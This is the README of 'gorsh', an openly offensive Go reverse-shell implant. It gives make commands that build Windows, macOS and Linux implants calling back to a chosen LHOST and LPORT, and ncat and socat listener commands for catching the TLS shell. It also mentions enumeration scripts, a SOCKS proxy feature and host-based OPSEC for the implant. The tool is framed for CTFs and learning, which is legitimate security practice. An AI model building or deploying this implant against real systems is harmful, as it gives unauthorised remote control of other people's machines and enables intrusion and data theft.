# gorsh

[go]lang [r]everse [sh]ell

[![forthebadge](https://forthebadge.com/images/badges/fuck-it-ship-it.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/no-ragrets.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/contains-technical-debt.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-crayons.svg)](https://forthebadge.com)

![](https://i.imgur.com/x51XH6K.png)
[![asciicast](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x.svg)](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x)

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Motivation

Learn go.  
Make a throwaway reverse shell for things like CTFs.  
Learn about host-based OPSEC considerations when writing an implant.

## Fork Changes

**Requires go1.11+**

See the [Changelog](./docs/CHANGELOG.md)

## Getting started

Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
with Go and setting up your Golang environment (with the `$GOPATH` environment variable).


```bash
go get -u github.com/gobuffalo/packr/packr
go get github.com/audibleblink/gorsh/...
git clone git@github.com:audibleblink/gorsh.git
cd gorsh
```

Makefile assumes this project is being built on Linux.

Be sure to read the Makefile. It gives you a good idea of what's going on.
If enabled in `Makefile`, the `zipcat` cmdlet uses the zStandard compression library which requires
`cgo` compilation.
Leave the defaults in the Makefile unless you're familiar with cross-compilation and cgo and have
the toolchains for it, or read [here](./docs/TROUBLESHOOTING.md) if you're feeling adventurous.

### Usage

First, generate your certs and ssh keys for the reverse proxy.

```bash
$ make depends
```

If you want to use the `socks` feature, edit `configs/ssh.json`. Create a user on the SSH server
and give it a `/bin/false` shell in `/etc/passwd`

For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.

Generate with:

```bash
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
#or
$ make all LHOST=example.com LPOST=443
```

### Enumeration Scripts

The `enum` command will present a selection dialog that allows once to run enumeration scripts based
on the host OS. You can update scripts in `scripts/prepare_enum_scripts.sh` and run 
`make enumscripts`. Addition of scripts will require modification of
`./internal/enum/enum_{windows,linux}.go`

[Troubleshooting](./docs/TROUBLESHOOTING.md)


#### Catching the shell

This project ships with a server that catches the reverse shell and still provides shell-like
capabilities you lose with traditional reverse shells, including:

* Tab Completion
* Vi-mode readline editing
* History
* Cursor movements

Generate the server with:

```sh
make server
build/srv/gorsh-listen --help
```

The gorsh-listener is a one-to-one relationship, like a traditional shell. For multiple shells, you
need to start multiple servers on different ports. 

To have the ability to receive multiple shells on the same port, there's the `make listen` target.
The `make listen` target kicks off a socat TLS pipe and creates new tmux windows with each new
incomgin connection.  Feed it a port number as PORT. 
`socat` is essentially acting as a TLS-terminating reverse proxy. The incoming connections are then
handed off to gorsh-listener through randomly generated Unix Domain Sockets.

```sh
make listen PORT=8080

# once a client connects, on a different terminal type:
tmux attach -t GORSH
```

Shells can also be caught without tmux or gorsh-listen using:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

Once executed, you will be provided with the tool's shell.
Type `help` to show what commands are supported.

## Credits

* Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
* Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
* mzpqnxow for figuring out my x-compilation and dependancy problems and troubleshooting guide
